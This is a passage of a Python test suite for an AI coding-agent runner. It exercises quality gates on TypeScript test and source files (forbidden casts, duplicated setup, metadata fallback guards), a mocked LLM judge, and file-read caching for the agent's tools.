            "  });\n"
            "});\n"
        )
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        assert "duplicated" in msg.lower() or "beforeEach" in msg

    def test_detects_duplicated_setup_across_two_tests(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        test_file = tmp_path / "src" / "file.test.ts"
        test_file.write_text(
            "describe('x', () => {\n"
            "  test('a', () => {\n"
            "    const client_say_spy = mock(() => undefined);\n"
            "    __setClientForTests(client_say_spy);\n"
            "    handleResub(channel, username, 0, message, userstate);\n"
            "  });\n"
            "  test('b', () => {\n"
            "    const client_say_spy = mock(() => undefined);\n"
            "    __setClientForTests(client_say_spy);\n"
            "    handleResub(channel, username, 1, message, userstate);\n"
            "  });\n"
            "});\n"
        )
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "Duplicated setup" in msg
        assert "client_say_spy" in msg

    def test_filters_changed_files_by_language_extensions(self, tmp_path, monkeypatch):
        """Only files matching the active language's extensions are scanned."""
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        (tmp_path / "config.toml").write_text('value = "as any"')
        (tmp_path / "helper.py").write_text("x = 'as any'")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": ["as any"]},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is True, f"Non-TS files should be excluded from TS quality scan: {msg}"

    def test_filters_by_language_for_checks(self, tmp_path, monkeypatch):
        """Check commands only receive files matching the active language."""
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("clean")
        (tmp_path / "stray.py").write_text("stray python file")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{
                        "name": "ts-only",
                        "command": "echo {changed_files} | grep -v '\\.py'",
                    }],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is True, f".py should not appear in TS check commands: {msg}"

    def test_timeout_degrades_to_failure_not_crash(self, tmp_path, monkeypatch):
        """A timed-out check command must return (False, msg), not raise."""
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("clean")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "slow", "command": "sleep 60"}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 0.1},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        assert "slow" in msg.lower() or "timeout" in msg.lower()

    def test_non_utf8_tool_output_degrades_to_failure_not_crash(self, tmp_path, monkeypatch):
        """A check command that emits non-UTF-8 bytes must not crash the helper."""
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("clean")
        # printf outputs raw bytes that are invalid UTF-8
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "badout", "command": "printf '\\xff\\xfe' && exit 1"}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        assert "badout" in msg.lower()

    def test_binary_file_degrades_to_failure_not_crash(self, tmp_path, monkeypatch):
        """A binary file in changed list must not crash the forbidden-pattern scan."""
        self._setup_repo(tmp_path, monkeypatch)
        # Write a binary file with a .ts extension so it passes the language filter
        (tmp_path / "src" / "data.ts").write_bytes(b"\x00\x01\x02\xff\xfe")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": ["as any"]},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        # Must not raise UnicodeDecodeError
        ok, msg = run_quality_checks("src/file.test.ts")
        assert isinstance(ok, bool)

    def test_check_failure_reports_error_count_not_raw_output(self, tmp_path, monkeypatch):
        """Check failures should report a compact summary, not raw tool output."""
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("clean")
        # Command that produces verbose multi-line output
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "typecheck", "command": "echo 'src/a.ts(1,1): error TS123\nsrc/b.ts(2,2): error TS456\nsrc/c.ts(3,3): error TS789' && exit 1"}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        # Should report error count, not dump all output
        assert "3 errors" in msg or "3 error" in msg

    def test_duplicated_setup_reports_identifiers_not_full_lines(self, tmp_path, monkeypatch):
        """Duplicated setup should list identifiers to move, not full lines."""
        self._setup_repo(tmp_path, monkeypatch)
        test_file = tmp_path / "src" / "file.test.ts"
        test_file.write_text(
            "describe('x', () => {\n"
            "  test('a', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doThing();\n"
            "  });\n"
            "  test('b', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doOther();\n"
            "  });\n"
            "  test('c', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doAnother();\n"
            "  });\n"
            "});\n"
        )
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        # Should mention beforeEach and list identifiers, not dump full lines
        assert "beforeEach" in msg
        assert "1 line" in msg or "1 repeated" in msg
        # Should NOT contain the full repeated line content
        assert "const spy = mock(() => {});" not in msg

    def test_duplicated_setup_judge_can_suppress_false_positive(self, tmp_path, monkeypatch):
        """Judge should suppress duplicated-setup findings for repeated act/assert."""
        self._setup_repo(tmp_path, monkeypatch)
        test_file = tmp_path / "src" / "file.test.ts"
        test_file.write_text(
            "describe('x', () => {\n"
            "  test('a', () => {\n"
            "    handleResub(channel, username, streakMonths, message, userstate);\n"
            "    expect(client_say_spy).toHaveBeenCalledWith(channel, expected_message);\n"
            "  });\n"
            "  test('b', () => {\n"
            "    handleResub(channel, username, streakMonths, message, userstate);\n"
            "    expect(client_say_spy).toHaveBeenCalledWith(channel, expected_message);\n"
            "  });\n"
            "  test('c', () => {\n"
            "    handleResub(channel, username, streakMonths, message, userstate);\n"
            "    expect(client_say_spy).toHaveBeenCalledWith(channel, expected_message);\n"
            "  });\n"
            "});\n"
        )

        class FakeResponse:
            def raise_for_status(self):
                return None

            def json(self):
                return {"message": {"content": "NO"}}

        monkeypatch.setattr("agentic_tdd_runner.quality.requests.post", lambda *a, **kw: FakeResponse())
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "duplicated_setup_judge": {"enabled": True},
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is True
        assert "Duplicated setup" not in msg

    def test_duplicated_setup_ignores_repeated_act_assert_without_judge(self, tmp_path, monkeypatch):
        """Repeated act/assert lines should not require the small judge to be suppressed."""
        self._setup_repo(tmp_path, monkeypatch)
        test_file = tmp_path / "src" / "file.test.ts"
        test_file.write_text(
            "describe('x', () => {\n"
            "  test('a', () => {\n"
            "    handleResub(channel, username, streakMonths, message, userstate);\n"
            "    expect(client_say_spy).toHaveBeenCalledWith(channel, expected_message);\n"
            "  });\n"
            "  test('b', () => {\n"
            "    handleResub(channel, username, streakMonths, message, userstate);\n"
            "    expect(client_say_spy).toHaveBeenCalledWith(channel, expected_message);\n"
            "  });\n"
            "  test('c', () => {\n"
            "    handleResub(channel, username, streakMonths, message, userstate);\n"
            "    expect(client_say_spy).toHaveBeenCalledWith(channel, expected_message);\n"
            "  });\n"
            "});\n"
        )
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is True
        assert "Duplicated setup" not in msg

    def test_duplicated_setup_treats_matcher_chain_as_assert(self):
        assert _is_obvious_assert_line("toHaveBeenCalledWith(channel, expected_message);") is True

    def test_duplicated_setup_treats_function_under_test_call_as_act(self):
        assert _is_obvious_act_line("handleResub(channel, username, streakMonths, message, userstate);") is True

    def test_duplicated_setup_judge_prompt_explicitly_bans_act_assert_in_before_each(self):
        prompt = _build_duplicated_setup_judge_prompt(
            "src/file.test.ts",
            "describe('x', () => {})\n",
            [
                "handleResub(channel, username, streakMonths, message, userstate);",
                "expect(client_say_spy).toHaveBeenCalledWith(channel, expected_message);",
            ],
        )

        assert "Never answer YES because of expect(...)" in prompt
        assert "toHaveBeenCalledWith(...)" in prompt
        assert "the direct call to the function under test" in prompt

    def test_duplicated_setup_reports_only_real_setup_from_mixed_duplicates(self, tmp_path, monkeypatch):
        """Mixed duplicate groups should report setup lines, not act/assert calls."""
        self._setup_repo(tmp_path, monkeypatch)
        test_file = tmp_path / "src" / "file.test.ts"
        test_file.write_text(
            "describe('x', () => {\n"
            "  test('a', () => {\n"
            "    const client_say_spy = mock(() => undefined);\n"
            "    __setClientForTests(client_say_spy);\n"
            "    handleResub(channel, username, streakMonths, message, userstate);\n"
            "    expect(client_say_spy).toHaveBeenCalledWith(channel, expected_message);\n"
            "  });\n"
            "  test('b', () => {\n"
            "    const client_say_spy = mock(() => undefined);\n"
            "    __setClientForTests(client_say_spy);\n"
            "    handleResub(channel, username, streakMonths, message, userstate);\n"
            "    expect(client_say_spy).toHaveBeenCalledWith(channel, expected_message);\n"
            "  });\n"
            "  test('c', () => {\n"
            "    const client_say_spy = mock(() => undefined);\n"
            "    __setClientForTests(client_say_spy);\n"
            "    handleResub(channel, username, streakMonths, message, userstate);\n"
            "    expect(client_say_spy).toHaveBeenCalledWith(channel, expected_message);\n"
            "  });\n"
            "});\n"
        )
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "client_say_spy" in msg
        assert "handleResub" not in msg

    def test_duplicated_setup_ignores_non_test_files_with_test_substring(self, tmp_path, monkeypatch):
        """Non-test files like contest.ts must not be pulled into duplicated-setup scan."""
        self._setup_repo(tmp_path, monkeypatch)
        source_file = tmp_path / "src" / "contest.ts"
        source_file.write_text(
            "export function contest() {\n"
            "  const spy = mock(() => {});\n"
            "  __setClient(spy);\n"
            "}\n"
            "export function contestAgain() {\n"
            "  const spy = mock(() => {});\n"
            "  __setClient(spy);\n"
            "}\n"
            "export function contestThird() {\n"
            "  const spy = mock(() => {});\n"
            "  __setClient(spy);\n"
            "}\n"
        )
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "runner": {"test_file_patterns": ["*.test.ts", "*.test.tsx", "*.test.js", "test_*.py"]},
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is True, msg
        assert "Duplicated setup" not in msg

    def test_duplicated_setup_judge_keeps_real_setup_finding_on_yes(self, tmp_path, monkeypatch):
        """Judge YES should keep the duplicated-setup failure."""
        self._setup_repo(tmp_path, monkeypatch)
        test_file = tmp_path / "src" / "file.test.ts"
        test_file.write_text(
            "describe('x', () => {\n"
            "  test('a', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doThing();\n"
            "  });\n"
            "  test('b', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doOther();\n"
            "  });\n"
            "  test('c', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doAnother();\n"
            "  });\n"
            "});\n"
        )

        class FakeResponse:
            def raise_for_status(self):
                return None

            def json(self):
                return {"message": {"content": "YES"}}

        monkeypatch.setattr("agentic_tdd_runner.quality.requests.post", lambda *a, **kw: FakeResponse())
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "duplicated_setup_judge": {"enabled": True},
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "Duplicated setup" in msg

    def test_duplicated_setup_judge_falls_back_to_conservative_behavior(self, tmp_path, monkeypatch):
        """Judge failure should keep the duplicated-setup finding instead of weakening the gate."""
        self._setup_repo(tmp_path, monkeypatch)
        test_file = tmp_path / "src" / "file.test.ts"
        test_file.write_text(
            "describe('x', () => {\n"
            "  test('a', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doThing();\n"
            "  });\n"
            "  test('b', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doOther();\n"
            "  });\n"
            "  test('c', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doAnother();\n"
            "  });\n"
            "});\n"
        )

        def raise_error(*_args, **_kwargs):
            raise RuntimeError("ollama unavailable")

        monkeypatch.setattr("agentic_tdd_runner.quality.requests.post", raise_error)
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "duplicated_setup_judge": {"enabled": True},
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "Duplicated setup" in msg

    def test_rejects_side_effect_payload_key_rename(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        source = tmp_path / "src" / "file.ts"
        source.write_text(
            "export function f(logger, username, months) {\n"
            "  logger.event('resub', { username, months });\n"
            "}\n"
        )
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "payload baseline"], cwd=tmp_path, capture_output=True, check=True)

        source.write_text(
            "export function f(logger, username, cumulativeMonths) {\n"
            "  logger.event('resub', { username, cumulativeMonths });\n"
            "}\n"
        )
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "Side-effect shape" in msg
        assert "months" in msg
        assert "cumulativeMonths" in msg

    def test_allows_side_effect_payload_value_change_with_same_key(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        source = tmp_path / "src" / "file.ts"
        source.write_text(
            "export function f(logger, username, months) {\n"
            "  logger.event('resub', { username, months });\n"
            "}\n"
        )
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "payload baseline"], cwd=tmp_path, capture_output=True, check=True)

        source.write_text(
            "export function f(logger, username, cumulativeMonths) {\n"
            "  logger.event('resub', { username, months: cumulativeMonths });\n"
            "}\n"
        )
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is True, msg
        assert "Side-effect shape" not in msg

    def test_rejects_parsed_metadata_without_original_fallback(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        source = tmp_path / "src" / "file.ts"
        source.write_text(
            "export function f(_streakMonths: number, userstate: Record<string, string>) {\n"
            "  const months = parseInt(userstate['msg-param-cumulative-months'] || '0', 10);\n"
            "  return months;\n"
            "}\n"
        )
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "Metadata fallback" in msg
        assert "_streakMonths" in msg

    def test_rejects_plain_callback_value_metadata_fallback_without_invalid_guard(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        source = tmp_path / "src" / "file.ts"
        source.write_text(
            "export function f(streakMonths: number, userstate: Record<string, string>) {\n"
            "  const raw = userstate['msg-param-cumulative-months'];\n"
            "  const months = typeof raw === 'string' ? parseInt(raw, 10) : streakMonths;\n"
            "  return months;\n"
            "}\n"
        )
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "Metadata fallback" in msg
        assert "streakMonths" in msg

    def test_allows_parsed_metadata_with_original_fallback(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        source = tmp_path / "src" / "file.ts"
        source.write_text(
            "export function f(_streakMonths: number, userstate: Record<string, string>) {\n"
            "  const parsed = Number(userstate['msg-param-cumulative-months']);\n"
            "  const months = Number.isNaN(parsed) ? _streakMonths : parsed;\n"
            "  return months;\n"
            "}\n"
        )
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is True, msg

    def test_rejects_truthy_metadata_fallback_that_drops_zero(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        source = tmp_path / "src" / "file.ts"
        source.write_text(
            "export function f(_streakMonths: number, userstate: Record<string, string>) {\n"
            "  const months = Number(userstate['msg-param-cumulative-months']) || _streakMonths;\n"
            "  return months;\n"
            "}\n"
        )
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "invalid parsed values" in msg
        assert "_streakMonths" in msg

    def test_rejects_parse_default_that_does_not_handle_invalid_metadata(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        source = tmp_path / "src" / "file.ts"
        source.write_text(
            "export function f(_streakMonths: number, userstate: Record<string, string>) {\n"
            "  const months = parseInt(\n"
            "    String(userstate['msg-param-cumulative-months'] ?? _streakMonths),\n"
            "    10,\n"
            "  );\n"
            "  return months;\n"
            "}\n"
        )
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "invalid parsed values" in msg
        assert "_streakMonths" in msg

    def test_allows_nan_guarded_metadata_fallback(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        source = tmp_path / "src" / "file.ts"
        source.write_text(
            "export function f(_streakMonths: number, userstate: Record<string, string>) {\n"
            "  const parsed = Number(userstate['msg-param-cumulative-months']);\n"
            "  const months = Number.isFinite(parsed) ? parsed : _streakMonths;\n"
            "  return months;\n"
            "}\n"
        )
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is True, msg

    def test_rejects_empty_object_type_assertion(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        source = tmp_path / "src" / "file.ts"
        source.write_text("export function f() {}\n")
        test_file = tmp_path / "src" / "file.test.ts"
        test_file.write_text(
            "import type { SubMethods } from 'tmi.js';\n"
            "const methods = {} as SubMethods;\n"
        )
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "Type assertion" in msg
        assert "{} as SubMethods" in msg


class TestFileReadDedup:
    """read_file returns a stub when the file hasn't changed since last read."""

    def test_first_read_returns_full_content(self, tmp_path, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        target = tmp_path / "src" / "file.ts"
        target.parent.mkdir(parents=True)
        target.write_text("const x = 1;\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        _agent_mod._file_read_cache.clear()

        result = execute_tool("read_file", {"path": "src/file.ts"})
        assert result == "const x = 1;\n"

    def test_second_read_returns_stub_when_unchanged(self, tmp_path, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        target = tmp_path / "src" / "file.ts"
        target.parent.mkdir(parents=True)
        target.write_text("const x = 1;\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        _agent_mod._file_read_cache.clear()

        execute_tool("read_file", {"path": "src/file.ts"})
        result = execute_tool("read_file", {"path": "src/file.ts"})
        assert "unchanged since last read" in result.lower()

    def test_returns_full_content_after_file_is_modified(self, tmp_path, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        target = tmp_path / "src" / "file.ts"
        target.parent.mkdir(parents=True)
        target.write_text("const x = 1;\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        _agent_mod._file_read_cache.clear()

        execute_tool("read_file", {"path": "src/file.ts"})
        # Modify the file — mtime changes
        target.write_text("const x = 2;\n")
        result = execute_tool("read_file", {"path": "src/file.ts"})
        assert result == "const x = 2;\n"

    def test_returns_full_content_after_external_mtime_invalidation(self, tmp_path, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        target = tmp_path / "src" / "file.ts"
        target.parent.mkdir(parents=True)
        target.write_text("const x = 1;\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        _agent_mod._file_read_cache.clear()

        execute_tool("read_file", {"path": "src/file.ts"})
        cached = execute_tool("read_file", {"path": "src/file.ts"})
        assert "unchanged since last read" in cached.lower()

        stat = target.stat()
        os.utime(target, ns=(stat.st_atime_ns, stat.st_mtime_ns + 1_000_000))

        result = execute_tool("read_file", {"path": "src/file.ts"})
        assert result == "const x = 1;\n"

    def test_directory_listing_bypasses_cache(self, tmp_path, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        src = tmp_path / "src"
        src.mkdir()
        (src / "a.ts").write_text("")
        (src / "b.ts").write_text("")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        _agent_mod._file_read_cache.clear()

        result1 = execute_tool("read_file", {"path": "src"})
        result2 = execute_tool("read_file", {"path": "src"})
        assert result1 == result2 == "a.ts\nb.ts"

    def test_edit_invalidates_cache_for_that_path(self, tmp_path, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        src = tmp_path / "src"
        src.mkdir()
        target = src / "file.ts"
        target.write_text("const x = 1;\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.detect_quality_tools",
            lambda lang_name: [],
        )
        _agent_mod._file_read_cache.clear()

        execute_tool("read_file", {"path": "src/file.ts"})
        execute_tool("str_replace_editor", {
            "path": "src/file.ts",
            "old_str": "const x = 1;\n",
            "new_str": "const x = 2;\n",
        })
        result = execute_tool("read_file", {"path": "src/file.ts"})
        assert result == "const x = 2;\n"

    def test_create_file_invalidates_cache_for_that_path(self, tmp_path, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        src = tmp_path / "src"
        src.mkdir()

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.detect_quality_tools",
            lambda lang_name: [],
        )
        _agent_mod._file_read_cache.clear()

        execute_tool("create_file", {"path": "src/new.ts", "content": "const y = 1;\n"})
        result = execute_tool("read_file", {"path": "src/new.ts"})
        assert result == "const y = 1;\n"

    def test_compaction_clears_cache(self, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        _agent_mod._file_read_cache[Path("/some/path")] = 12345
        _agent_mod._file_read_cache[Path("/other/path")] = 67890

        messages = [
            {"role": "system", "content": "system prompt"},
            {"role": "user", "content": "fix bug"},
        ]
        _compact_messages_after_quality_failure(messages, "quality fail", "test.ts")

        assert len(_agent_mod._file_read_cache) == 0


class TestExecuteToolReactiveChecks:
    """Edits to TS files should surface typecheck failures inline."""

    def test_run_command_clears_stale_exit_code_before_execution(self, tmp_path, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        def fake_run(*args, **kwargs):
            assert _agent_mod._last_run_exit_code is None
            return subprocess.CompletedProcess(args[0], 1, stdout="", stderr="boom")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {"timeouts": {"tool_execution": 10}})
        monkeypatch.setattr("agentic_tdd_runner.agent.subprocess.run", fake_run)
        _agent_mod._last_run_exit_code = 0

        result = execute_tool("run_command", {"command": "git status"})

        assert result == "boom"
        assert _agent_mod._last_run_exit_code == 1

    def test_tool_applied_status_marks_edit_success_and_failure(self):
        assert _tool_applied_status("str_replace_editor", "OK: replaced in src/file.ts") is True
        assert _tool_applied_status("create_file", "OK: created src/file.test.ts") is True
        assert _tool_applied_status("str_replace_editor", "ERROR: old_str not found") is False
        assert _tool_applied_status("read_file", "contents") is None

    def test_str_replace_editor_appends_reactive_typecheck_failure(self, tmp_path, monkeypatch):
        src = tmp_path / "src"
        src.mkdir()
        target = src / "file.ts"
        target.write_text("const value = 1;\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.detect_quality_tools",
            lambda lang_name: [{"name": "typecheck", "command": "fake-tsc --noEmit"}]
            if lang_name == "typescript" else [],
        )

        def fake_run(command, **kwargs):
            assert command == "fake-tsc --noEmit"
            return SimpleNamespace(
                returncode=1,
                stdout="src/file.ts(1,1): error TS123 broken types\n",
                stderr="",
            )

        monkeypatch.setattr("agentic_tdd_runner.agent.subprocess.run", fake_run)

